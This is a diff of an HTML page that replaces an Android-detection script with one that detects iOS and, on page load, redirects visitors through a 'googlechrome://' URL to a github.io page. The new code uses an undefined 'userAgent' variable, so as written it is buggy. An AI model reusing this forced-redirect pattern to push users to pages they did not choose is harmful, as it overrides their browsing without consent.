@@ -11,7 +11,7 @@
  
 </html>
 
-<script>
+<script>/*
   (function() {
      function isAndroid() {
         return ( 
@@ -24,6 +24,23 @@
         
     }else {
          location.href = 'googlechrome://dts24839169.github.io/wapaul-1/222.html';
+     }
+    })();
+*/</script>
+
+<script>
+  (function() {
+     function isIos() {
+        return ( 
+         (/iPhone|iPad|iPod/i.test(userAgent))
+  );
+ }
+  
+    if(isIos()) {
+         location.href = 'googlechrome://dts24839169.github.io/wapaul-1/222.html';  
+        
+    }else {
+         location.href = 'googlechrome://navigate?url=dts24839169.github.io/wapaul-1/222.html';
      }
     })();
 </script>
